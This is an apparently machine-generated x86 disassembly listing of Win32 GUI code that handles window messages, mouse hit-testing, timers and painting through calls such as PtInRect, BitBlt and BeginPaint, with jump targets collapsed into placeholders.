test esi esi
je r-xdata
call sub_4407b7
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test esi esi
jne r-xdata
mov edi [ esp + 0x24 ]
cmp edi [ esp + 0x1c ]
je r-xdata
mov esi [ esi ]
jmp r-xdata
call sub_4407b7
cmp edi [ esi + 0x18 ]
jne r-xdata
mov eax [ edi + 0x28 ]
mov ecx [ eax ]
mov esi [ edi + 0x10 ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x18 ] esi
call sub_4407b7
call sub_4407b7
cmp esi eax
je r-xdata
mov ecx [ esp + 0x10 ]
lea eax [ ebp + 0x8 ]
push eax
push ecx
lea eax [ esp + 0x40 ]
call sub_425ed0
mov esi [ esp + 0x44 ]
mov ebx [ esp + 0x40 ]
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
push esi
push ebx
push edx
mov [ esp + 0x20 ] edi
push eax
lea edi [ esp + 0x24 ]
call sub_425f60
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x48 ]
add esp 0x10
push esi
push ebx
push ecx
push edx
lea eax [ esp + 0x40 ]
push eax
mov eax [ esp + 0x24 ]
call sub_426ab0
cmp esi edi
jne r-xdata
mov eax [ esp + 0x2c ]
cmp [ esp + 0x1c ] eax
je r-xdata
mov esi [ esi ]
jmp r-xdata
call sub_4407b7
xor esi esi
mov ecx [ esp + 0x1c ]
cmp ecx [ esi + 0x18 ]
jne r-xdata
mov edx [ esp + 0x1c ]
mov eax [ edx + 0x10 ]
lea ecx [ esp + 0xc ]
push ecx
mov [ esp + 0x10 ] eax
push ebx
lea eax [ esp + 0x40 ]
call sub_4257d0
mov esi [ esp + 0x44 ]
mov edx [ esp + 0x40 ]
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
push esi
push edx
push eax
mov [ esp + 0x20 ] edi
push ecx
lea edi [ esp + 0x24 ]
call sub_425860
mov edx [ esp + 0x50 ]
mov eax [ esp + 0x4c ]
mov ecx [ esp + 0x48 ]
add esp 0x10
push esi
push edx
push eax
push ecx
lea edx [ esp + 0x40 ]
push edx
mov eax ebx
call sub_425cf0
cmp [ ebx + 0x40 ] 0x0
lea eax [ ebx + 0x40 ]
je r-xdata
call sub_4407b7
lea esi [ esp + 0x18 ]
call sub_4264e0
mov esi [ esp + 0x18 ]
mov edi [ esp + 0x24 ]
jmp r-xdata
mov esi [ esp + 0xc ]
mov edi [ ebx + 0x44 ]
push eax
call sub_425e50
mov edx [ edi + 0x28 ]
mov eax [ edi + 0x10 ]
xor edi edi
mov [ esp + 0x2c ] edx
cmp esi edi
je r-xdata
sub_426d80
push edi
mov edi eax
cmp edi 0x39
ja r-xdata
cmp edi 0x115
ja r-xdata
je r-xdata
cmp edi 0x132
jb r-xdata
cmp edi 0x114
jae r-xdata
test ebx ebx
je r-xdata
lea eax [ edi - 0x2b ]
cmp eax 0x4
ja r-xdata
mov ecx [ esp + 0x8 ]
mov [ ecx ] 0x0
mov eax 0x1
pop edi
retn 0x4
cmp edi 0x138
jbe r-xdata
mov eax esi
cmp edi 0x4e
je r-xdata
mov eax [ esi + 0x8 ]
jmp r-xdata
jmp [ eax * 4 + jump_table_426e50 ]
cmp edi 0x210
jne r-xdata
push esi
push ebx
add edi 0x2000
push edi
push eax
call [ SendMessageW@IAT ]
pop edi
retn 0x4
mov eax [ esi ]
jmp r-xdata
cmp edi 0x111
jne r-xdata
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
movzx eax bx
dec eax
cmp eax 0x1
jbe r-xdata
test esi esi
je r-xdata
mov eax [ esi + 0x14 ]
jmp r-xdata
mov eax [ esi + 0x4 ]
push eax
mov eax [ ecx + 0x4 ]
push eax
call [ GetDlgItem@IAT ]
jmp r-xdata
mov eax [ esi + 0xc ]
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov edx ebx
shr edx 0x10
push edx
push eax
call [ GetDlgItem@IAT ]
jmp r-xdata
sub_426e70
mov ecx [ edi + 0x18 ]
mov eax [ ecx + 0x4 ]
sub esp 0x18
cmp [ eax + 0x29 ] 0x0
push ebx
push ebp
mov ebp [ esp + 0x28 ]
push esi
mov esi ecx
jne r-xdata
mov eax [ edi ]
mov ebx [ edi + 0x18 ]
mov [ esp + 0x14 ] esi
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov ecx [ ebp ]
jmp r-xdata
call sub_4407b7
cmp eax eax
je r-xdata
cmp [ eax + 0xc ] ecx
jae r-xdata
mov ecx [ edi + 0x18 ]
mov edx [ edi ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x18 ] edx
lea eax [ esp + 0x18 ]
mov eax [ ebp ]
cmp eax [ esi + 0xc ]
jb r-xdata
cmp esi ebx
je r-xdata
mov esi eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea eax [ esp + 0x10 ]
jmp r-xdata
cmp [ eax + 0x29 ] 0x0
je r-xdata
mov edx [ eax ]
mov ecx [ esp + 0x28 ]
mov eax [ eax + 0x4 ]
pop esi
pop ebp
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
add esp 0x18
retn 0x8
sub_426f00
sub esp 0xc
push ebx
push ebp
mov ebp [ esp + 0x1c ]
push esi
push edi
mov edi eax
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
call sub_426e70
mov esi [ esp + 0x10 ]
mov ebx [ edi + 0x18 ]
mov edi [ edi ]
test esi esi
je r-xdata
call sub_4407b7
cmp esi edi
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x8
mov edi [ esp + 0x14 ]
cmp edi ebx
jne r-xdata
mov esi [ esi ]
jmp r-xdata
call sub_4407b7
cmp edi [ esi + 0x18 ]
jne r-xdata
test ebp ebp
je r-xdata
call sub_4407b7
mov eax [ edi + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x8
mov edx [ edi + 0x10 ]
mov [ ebp ] edx
sub_426f90
sub esp 0x8
mov eax [ eax + 0x4 ]
lea ecx [ esp + 0x4 ]
push ecx
push eax
mov eax [ esp + 0x14 ]
add eax 0x4
mov [ esp + 0xc ] 0x0
call sub_426f00
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
add esp 0x8
retn 0x4
mov edx [ ecx ]
push esi
push eax
mov eax [ edx + 0x40 ]
call eax
sub_426fe0
sub esp 0x14
push ebx
movzx edx ax
shr eax 0x10
push ebp
mov ebp eax
mov eax [ edi + 0x64 ]
xor ebx ebx
push esi
mov [ esp + 0x18 ] edx
mov [ esp + 0x1c ] ebp
cmp eax ebx
je r-xdata
xor esi esi
cmp [ edi + 0x5c ] ebx
mov [ esp + 0x10 ] esi
jle r-xdata
mov [ esp + 0x10 ] edx
mov ecx ebp
mov [ esp + 0x14 ] ecx
mov esi edx
sub esi [ eax + 0xc ]
push ebp
mov [ esp + 0x14 ] esi
sub ecx [ eax + 0x10 ]
push edx
add eax 0xc
push eax
mov [ esp + 0x20 ] ecx
call [ PtInRect@IAT ]
test eax eax
je r-xdata
mov ecx [ edi + 0x68 ]
cmp esi ecx
je r-xdata
test ebx ebx
jl r-xdata
mov ecx [ edi + 0x64 ]
cmp [ edi + 0x68 ] ecx
jne r-xdata
cmp [ edi + 0x68 ] ebx
jne r-xdata
test esi esi
je r-xdata
test ecx ecx
je r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp ebx [ edi + 0x5c ]
jge r-xdata
mov ecx [ edi + 0x64 ]
mov edx [ ecx ]
mov edx [ edx + 0x34 ]
lea eax [ esp + 0x10 ]
push eax
call edx
pop esi
pop ebp
pop ebx
add esp 0x14
retn 0x4
mov [ edi + 0x68 ] ebx
mov edx [ ecx ]
mov eax [ edx + 0x3c ]
call eax
mov ecx [ edi + 0x64 ]
mov [ edi + 0x68 ] ecx
mov eax [ ecx ]
mov eax [ eax + 0x38 ]
lea edx [ esp + 0x10 ]
push edx
call eax
mov ecx [ edi + 0x64 ]
mov edx [ ecx ]
mov edx [ edx + 0x34 ]
lea eax [ esp + 0x10 ]
push eax
call edx
pop esi
pop ebp
pop ebx
add esp 0x14
retn 0x4
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn 0x4
mov eax [ esi ]
mov edx [ eax + 0x34 ]
lea ecx [ esp + 0x18 ]
push ecx
mov ecx esi
call edx
mov eax [ esp + 0x24 ]
mov [ eax ] 0x0
mov [ edi + 0x68 ] esi
test esi esi
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x3c ]
call eax
mov eax [ edi + 0x58 ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi + 0x4 ]
test al 0x1
je r-xdata
mov edx [ esi ]
mov edx [ edx + 0x38 ]
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call edx
inc ebx
cmp ebx [ edi + 0x5c ]
jl r-xdata
shr eax 0x2
not eax
test al 0x1
je r-xdata
mov esi [ esp + 0x10 ]
push ebp
push edx
lea ecx [ esi + 0xc ]
push ecx
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov edx [ esi + 0xc ]
sub [ esp + 0x18 ] edx
mov eax [ esi + 0x10 ]
sub [ esp + 0x1c ] eax
mov [ esp + 0x10 ] esi
jmp r-xdata
mov ebp [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
sub_427150
sub esp 0xc
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
lea eax [ esp + 0x10 ]
xor edi edi
push eax
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
call [ GetCursorPos@IAT ]
mov edx [ ebx + 0x54 ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
call [ ScreenToClient@IAT ]
cmp [ ebx + 0x64 ] edi
je r-xdata
cmp [ ebx + 0x5c ] edi
jle r-xdata
mov ecx [ ebx + 0x64 ]
mov eax [ ecx + 0xc ]
sub [ esp + 0x10 ] eax
mov edx [ ecx + 0x10 ]
sub [ esp + 0x14 ] edx
mov eax [ ecx ]
mov eax [ eax + 0x24 ]
lea edx [ esp + 0x10 ]
push edx
call eax
mov [ ebp ] eax
pop edi
pop esi
pop ebp
add esp 0xc
retn 0x4
mov [ ebp ] 0x0
xor eax eax
pop edi
pop esi
pop ebp
add esp 0xc
retn 0x4
test edi edi
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp edi [ ebx + 0x5c ]
jge r-xdata
mov ecx [ ebx + 0x58 ]
mov esi [ ecx + edi * 4 ]
mov eax [ esi + 0x4 ]
test al 0x1
je r-xdata
inc edi
cmp edi [ ebx + 0x5c ]
jl r-xdata
shr eax 0x2
not eax
test al 0x1
je r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push edx
push eax
lea ecx [ esi + 0xc ]
push ecx
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov edx [ esi + 0xc ]
sub [ esp + 0x10 ] edx
mov eax [ esi + 0x10 ]
sub [ esp + 0x14 ] eax
mov edx [ esi ]
mov edx [ edx + 0x24 ]
lea eax [ esp + 0x10 ]
push eax
mov ecx esi
call edx
pop edi
pop esi
mov [ ebp ] eax
pop ebp
add esp 0xc
retn 0x4
sub_427240
sub esp 0xc
push ebp
movzx ebp ax
shr eax 0x10
cmp [ ebx + 0x64 ] 0x0
push esi
mov edx eax
push edi
mov [ esp + 0x10 ] ebp
mov [ esp + 0x14 ] edx
je r-xdata
xor edi edi
cmp [ ebx + 0x5c ] edi
jle r-xdata
mov ecx [ ebx + 0x64 ]
sub ebp [ ecx + 0xc ]
mov [ esp + 0x10 ] ebp
sub edx [ ecx + 0x10 ]
mov [ esp + 0x14 ] edx
mov eax [ ecx ]
mov eax [ eax + 0x30 ]
lea edx [ esp + 0x10 ]
push edx
call eax
pop edi
pop esi
pop ebp
add esp 0xc
retn 0x4
mov edx [ esp + 0x1c ]
mov [ edx ] 0x0
xor eax eax
pop edi
pop esi
pop ebp
add esp 0xc
retn 0x4
test edi edi
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp edi [ ebx + 0x5c ]
jge r-xdata
mov ecx [ ebx + 0x58 ]
mov esi [ ecx + edi * 4 ]
mov eax [ esi + 0x4 ]
test al 0x1
je r-xdata
inc edi
cmp edi [ ebx + 0x5c ]
jl r-xdata
shr eax 0x2
not eax
test al 0x1
je r-xdata
push edx
push ebp
lea edx [ esi + 0xc ]
push edx
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
sub [ esp + 0x10 ] eax
mov ecx [ esi + 0x10 ]
sub [ esp + 0x14 ] ecx
mov edx [ esi ]
mov edx [ edx + 0x30 ]
lea eax [ esp + 0x10 ]
push eax
mov ecx esi
call edx
mov ecx [ esp + 0x1c ]
pop edi
pop esi
mov [ ecx ] eax
xor eax eax
pop ebp
add esp 0xc
retn 0x4
mov edx [ esp + 0x14 ]
mov ebp [ esp + 0x10 ]
sub_427320
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x8
push esi
movzx esi ax
shr eax 0x10
cmp [ ebx + 0x64 ] 0x0
mov edx eax
push edi
mov [ esp + 0x8 ] esi
mov [ esp + 0xc ] edx
je r-xdata
xor edi edi
cmp [ ebx + 0x5c ] edi
jle r-xdata
mov ecx [ ebx + 0x64 ]
sub esi [ ecx + 0xc ]
mov [ esp + 0x8 ] esi
sub edx [ ecx + 0x10 ]
mov [ esp + 0xc ] edx
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
lea edx [ esp + 0x8 ]
push edx
call eax
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov [ edx ] 0x0
xor eax eax
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
test edi edi
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp edi [ ebx + 0x5c ]
jge r-xdata
mov ecx [ ebx + 0x58 ]
mov esi [ ecx + edi * 4 ]
mov eax [ esi + 0x4 ]
test al 0x1
je r-xdata
inc edi
cmp edi [ ebx + 0x5c ]
jl r-xdata
shr eax 0x2
not eax
test al 0x1
je r-xdata
push edx
mov edx [ esp + 0xc ]
push edx
lea eax [ esi + 0xc ]
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov ecx [ esi + 0xc ]
sub [ esp + 0x8 ] ecx
mov edx [ esi + 0x10 ]
sub [ esp + 0xc ] edx
mov eax [ esi ]
mov edx [ eax + 0x28 ]
lea ecx [ esp + 0x8 ]
push ecx
mov ecx esi
call edx
mov ecx [ ebp + 0x8 ]
pop edi
mov [ ecx ] eax
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ esp + 0xc ]
sub_427400
sub esp 0xc
push ebp
movzx ebp ax
shr eax 0x10
cmp [ ebx + 0x64 ] 0x0
push esi
mov edx eax
push edi
mov [ esp + 0x10 ] ebp
mov [ esp + 0x14 ] edx
je r-xdata
xor edi edi
cmp [ ebx + 0x5c ] edi
jle r-xdata
mov ecx [ ebx + 0x64 ]
sub ebp [ ecx + 0xc ]
mov [ esp + 0x10 ] ebp
sub edx [ ecx + 0x10 ]
mov [ esp + 0x14 ] edx
mov eax [ ecx ]
mov eax [ eax + 0x2c ]
lea edx [ esp + 0x10 ]
push edx
call eax
pop edi
pop esi
pop ebp
add esp 0xc
retn 0x4
mov edx [ esp + 0x1c ]
mov [ edx ] 0x0
xor eax eax
pop edi
pop esi
pop ebp
add esp 0xc
retn 0x4
test edi edi
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp edi [ ebx + 0x5c ]
jge r-xdata
mov ecx [ ebx + 0x58 ]
mov esi [ ecx + edi * 4 ]
mov eax [ esi + 0x4 ]
test al 0x1
je r-xdata
inc edi
cmp edi [ ebx + 0x5c ]
jl r-xdata
shr eax 0x2
not eax
test al 0x1
je r-xdata
push edx
push ebp
lea edx [ esi + 0xc ]
push edx
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
sub [ esp + 0x10 ] eax
mov ecx [ esi + 0x10 ]
sub [ esp + 0x14 ] ecx
mov edx [ esi ]
mov edx [ edx + 0x2c ]
lea eax [ esp + 0x10 ]
push eax
mov ecx esi
call edx
mov ecx [ esp + 0x1c ]
pop edi
pop esi
mov [ ecx ] eax
xor eax eax
pop ebp
add esp 0xc
retn 0x4
mov edx [ esp + 0x14 ]
mov ebp [ esp + 0x10 ]
sub_427500
push esi
push 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call [ GetDC@IAT ]
mov esi eax
push esi
call [ CreateCompatibleDC@IAT ]
push 0x80
push 0x400
push esi
mov [ rw-data ] eax
call [ CreateCompatibleBitmap@IAT ]
push eax
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
call [ SelectObject@IAT ]
push esi
push 0x0
mov [ rw-data ] eax
call [ ReleaseDC@IAT ]
mov [ rw-data ] 0x400
mov [ rw-data ] 0x80
mov eax rw-data
pop esi
retn
sub_427580
sub esp 0x20
cmp [ esp + 0x30 ] 0x0
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
mov edx [ esi + 0x14 ]
push ebx
mov ebx [ esi + 0x18 ]
push ebp
mov ebp [ esp + 0x30 ]
push edi
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] ebx
mov edi ebp
je r-xdata
cmp [ esp + 0x38 ] 0x0
je r-xdata
cmp [ esp + 0x38 ] 0x0
je r-xdata
pop edi
pop ebp
pop ebx
add esp 0x20
retn 0x18
cmp edi ebp
jne r-xdata
mov ecx [ esp + 0x30 ]
mov eax [ ecx ]
mov eax [ eax + 0x3c ]
lea edx [ esp + 0x18 ]
push edx
push edi
call eax
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
mov ebp [ esp + 0x34 ]
mov ebp [ rw-data ]
test ebp ebp
je r-xdata
push 0x0
push 0x0
push 0x0
push edi
call [ SetViewportOrgEx@IAT ]
mov eax [ esp + 0x44 ]
mov edx [ esi ]
mov edx [ edx + 0x1c ]
push eax
push 0xffffffff
push edi
mov ecx esi
call edx
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push 0xcc0020
push 0x0
push 0x0
push edi
sub ecx eax
push ecx
mov ecx [ esp + 0x2c ]
sub edx ecx
push edx
push eax
push ecx
push ebp
call [ BitBlt@IAT ]
lea edx [ esp + 0x10 ]
push edx
push eax
push ecx
push edi
call [ OffsetViewportOrgEx@IAT ]
mov ecx [ esp + 0x44 ]
mov eax [ esi ]
mov edx [ eax + 0x1c ]
push ecx
push 0xffffffff
push edi
mov ecx esi
call edx
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
push 0x0
push eax
push ecx
push edi
call [ SetViewportOrgEx@IAT ]
jmp r-xdata
sub edx ecx
cmp [ rw-data ] edx
jl r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x1c ]
push ecx
push edx
push eax
push ebp
call [ ExcludeClipRect@IAT ]
cmp [ esp + 0x40 ] 0x0
je r-xdata
sub ebx eax
cmp [ rw-data ] ebx
jl r-xdata
push 0x0
neg eax
push eax
neg ecx
push ecx
mov edi ebp
push edi
call [ SetViewportOrgEx@IAT ]
sub_4276c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x5c ] ebx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test ebx ebx
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp ebx [ edi + 0x5c ]
jge r-xdata
mov eax [ edi + 0x58 ]
mov esi [ eax + ebx * 4 ]
test [ esi + 0x4 ] 0x1
je r-xdata
inc ebx
cmp ebx [ edi + 0x5c ]
jl r-xdata
mov ecx [ ebp + 0xc ]
push ecx
lea edx [ esi + 0xc ]
push edx
lea eax [ esp + 0x18 ]
push eax
call [ IntersectRect@IAT ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
push 0x0
push 0x1
and ecx 0x8
push ecx
push 0x1
push edx
push edi
call sub_427580
sub_427790
push 0xffffffff
push sub_458ff8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
test edi edi
je r-xdata
mov eax [ esi + 0x54 ]
lea ecx [ esp + 0x1c ]
push ecx
push eax
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x20 ] eax
call [ BeginPaint@IAT ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x68 ] 0x0
mov edx [ esi ]
mov edx [ edx + 0x40 ]
lea ecx [ esp + 0x24 ]
push ecx
push eax
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ esp + 0x14 ]
mov eax [ eax + 0x3c ]
lea ecx [ esp + 0x24 ]
push ecx
push edx
mov ecx esi
call eax
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x1c ]
push ecx
push edx
call [ EndPaint@IAT ]
lea eax [ esp + 0x4 ]
push eax
push edi
call [ GetClipBox@IAT ]
mov edx [ esi ]
mov edx [ edx + 0x40 ]
lea eax [ esp + 0x4 ]
push eax
push edi
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x3c ]
lea ecx [ esp + 0x4 ]
push ecx
push edi
mov ecx esi
call edx
jmp r-xdata
xor eax eax
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_43f96b
add esp 0x68
retn
sub_427870
sub esp 0x20
cmp [ esi + 0x68 ] 0x0
push edi
je r-xdata
xor edi edi
cmp [ esi + 0x5c ] edi
jle r-xdata
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax 0x1
pop edi
add esp 0x20
retn
test edi edi
jl r-xdata
lea eax [ esp + 0x8 ]
push eax
call [ GetCursorPos@IAT ]
mov edx [ esi + 0x54 ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
call [ GetClientRect@IAT ]
mov ecx [ esi + 0x54 ]
push 0x2
lea eax [ esp + 0x14 ]
push eax
push 0x0
push ecx
call [ MapWindowPoints@IAT ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push edx
push eax
lea ecx [ esp + 0x18 ]
push ecx
call [ PtInRect@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp edi [ esi + 0x5c ]
jge r-xdata
mov ecx [ esi + 0x68 ]
mov edx [ ecx ]
mov eax [ edx + 0x3c ]
call eax
mov [ esi + 0x68 ] 0x0
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push edx
push eax
call [ WindowFromPoint@IAT ]
cmp eax [ esi + 0x54 ]
je r-xdata
mov ecx [ esi + 0x58 ]
mov ecx [ ecx + edi * 4 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
inc edi
cmp edi [ esi + 0x5c ]
jl r-xdata
sub_427930
mov ecx [ edi + 0x54 ]
push ebx
push ebp
push esi
push 0xd431
xor ebp ebp
push ecx
mov [ eax ] ebp
call [ KillTimer@IAT ]
mov ecx [ edi + 0x68 ]
cmp ecx ebp
je r-xdata
mov ecx [ edi + 0x64 ]
cmp ecx ebp
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x3c ]
call eax
mov [ edi + 0x68 ] ebp
xor ebx ebx
cmp [ edi + 0x5c ] ebp
jle r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
call eax
mov [ edi + 0x64 ] ebp
mov eax 0x1
mov [ edi + 0x4c ] eax
mov [ edi + 0x50 ] eax
mov [ edi + 0x54 ] ebp
mov [ edi + 0x64 ] ebp
mov [ edi + 0x68 ] ebp
mov eax [ edi + 0x58 ]
cmp eax ebp
je r-xdata
nop
pop esi
mov [ edi + 0x5c ] ebp
mov [ edi + 0x60 ] ebp
pop ebp
xor eax eax
pop ebx
retn
push eax
call sub_44120e
add esp 0x4
mov [ edi + 0x58 ] ebp
push ebp
push ebp
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp ebx [ edi + 0x5c ]
jge r-xdata
mov ecx [ edi + 0x58 ]
mov esi [ ecx + ebx * 4 ]
mov edx [ esi ]
mov eax [ edx + 0xc ]
mov ecx esi
call eax
xor eax eax
mov [ esi + 0x4 ] ebp
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
inc ebx
mov [ esi + 0x1c ] ebp
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
cmp ebx [ edi + 0x5c ]
jl r-xdata
cmp ebx ebp
jl r-xdata
sub_4279f0
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x54 ] 0x0
push esi
push edi
mov esi ecx
mov edi edx
jne r-xdata
cmp edi 0x4e
jne r-xdata
push 0x0
push 0x64
push 0xd431
push eax
mov [ ebx + 0x54 ] eax
call [ SetTimer@IAT ]
cmp edi 0x200
jne r-xdata
cmp [ esi + 0x8 ] 0xfffffdee
jne r-xdata
cmp edi 0x14
jne r-xdata
lea edx [ esp + 0xc ]
push edx
mov eax esi
mov edi ebx
mov [ esp + 0x10 ] 0x1
call sub_426fe0
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
test [ esi + 0xb4 ] 0x1
mov edi 0x1
je r-xdata
cmp edi 0xf
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ edx ] 0x1
lea eax [ edi - 0x13 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ebx
mov eax esi
call sub_426f90
xor edi edi
xor eax eax
jmp r-xdata
cmp edi 0x20
jne r-xdata
mov edi [ ebp + 0xc ]
mov esi ebx
call sub_427790
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
test edi edi
cmp edi 0x203
jne r-xdata
lea edx [ esp + 0xc ]
push edx
mov [ esp + 0x10 ] 0x1
call sub_427150
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
je r-xdata
cmp edi 0x201
jne r-xdata
lea edx [ esp + 0xc ]
push edx
mov eax esi
mov [ esp + 0x10 ] 0x1
call sub_427240
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
je r-xdata
lea eax [ edi - 0x1f ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp edi 0x202
jne r-xdata
lea edx [ esp + 0xc ]
push edx
mov eax esi
mov [ esp + 0x10 ] 0x1
call sub_427320
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp edi 0x318
jne r-xdata
lea edx [ esp + 0xc ]
push edx
mov eax esi
mov [ esp + 0x10 ] 0x1
call sub_427400
cmp [ esp + 0xc ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp edi 0x113
jne r-xdata
mov edi [ ebp + 0xc ]
mov esi ebx
call sub_427790
mov edx [ ebp + 0x10 ]
mov [ edx ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp edi 0x215
jne r-xdata
cmp [ ebp + 0xc ] 0xd431
mov edi 0x1
jne r-xdata
cmp edi 0x5
jne r-xdata
mov ecx [ ebx + 0x64 ]
mov esi 0x1
test ecx ecx
je r-xdata
mov esi ebx
call sub_427870
jmp r-xdata
cmp edi 0xb
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ edx ] 0x1
mov ecx [ ebp + 0x10 ]
xor esi esi
mov [ ecx ] esi
test esi esi
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
call eax
mov ecx [ ebp + 0x10 ]
mov [ ebx + 0x64 ] 0x0
mov [ ecx ] 0x0
test esi esi
jmp r-xdata
cmp edi 0x2
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
pop edi
mov [ ebx + 0x4c ] eax
pop esi
mov [ ecx ] 0x0
